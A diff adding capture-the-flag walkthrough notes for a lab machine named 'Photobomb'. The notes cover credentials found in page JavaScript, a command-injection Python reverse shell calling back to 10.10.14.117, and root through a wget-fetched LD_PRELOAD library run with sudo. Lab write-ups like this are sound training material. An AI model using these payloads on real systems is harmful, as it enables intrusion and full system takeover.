@@ -1,0 +1,97 @@
+Machine-Name : Photobomb
+IP Address   : 10.10.11.182
+
+Command-Line: sudo nmap 10.10.11.182 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Notes: Visited 10.10.11.182 using the browser. Returned 404 not found for http://Photobomb.htb
+
+Command-Line: sudo nano /etc/hosts
+Result:
+    10.10.11.182 photobomb.htb
+
+Notes: Viewed page source. Found credentials in photobomb.js file.
+Result:
+    function init() {
+      // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+      if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+        document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
+      }
+    }
+    window.onload = init;
+
+Notes: Logging into /printer using the credentials found (pH0t0:b0Mb!).
+Result:
+    ** Successful Login **
+
+Notes: Page shows images and ability to download them. Opening BurpSuite and attempting to inject a python reverse shell into one of the POST parameters.
+
+Command-Line: nc -lvnp 9001
+
+BurpSuite Repeater:
+    POST /printer HTTP/1.1
+    Host: photobomb.htb
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 326
+    Origin: http://photobomb.htb
+    DNT: 1
+    Authorization: Basic cEgwdDA6YjBNYiE=
+    Connection: keep-alive
+    Referer: http://photobomb.htb/printer
+    Upgrade-Insecure-Requests: 1
+
+    photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=ppython3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.117",9001))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b'&dimensions=3000x2000
+Result:
+    ** REVERSE SHELL **
+    ** USER ACCESS **
+    $
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result:
+    wizard@photobomb:~/photobomb$
+
+wizard@photobomb:~/photobomb$ cat /home/wizard/user.txt
+Result:
+    *** USER OWNED ***
+
+wizard@photobomb:~$ sudo -l
+Result:
+    Matching Defaults entries for wizard on photobomb:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User wizard may run the following commands on photobomb:
+        (root) SETENV: NOPASSWD: /opt/cleanup.sh
+
+Browser: LD_PRELOAD exploit
+Result:
+    https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+
+Command-Line: mkdir www && cd www && nano malloc.c
+Result:
+    ./www/malloc.c
+Command-Line: gcc -fPIC -shared -o malloc.so malloc.c -nostartfiles
+Result:
+    ./www/malloc.so
+
+Command-Line(./www): python3 -m http.server 80
+Result:
+    Serving HTTP on port 80...
+
+wizard@photobomb:~$ wget 'http://10.10.14.117/malloc.so' -o malloc.so
+wizard@photobomb:~$ chmod 777 malloc.so
+wizard@photobomb:~$ sudo LD_PRELOAD=/home/wizard/malloc.so /opt/cleanup.sh
+Result:
+    ** ROOT ACCESS **
+    root@photobomb:/home/wizard#
+
+root@photobomb:/home/wizard# cat /root/root.txt
+Result:
+    ** ROOT OWNED **
+
+      *** FINISHED ***
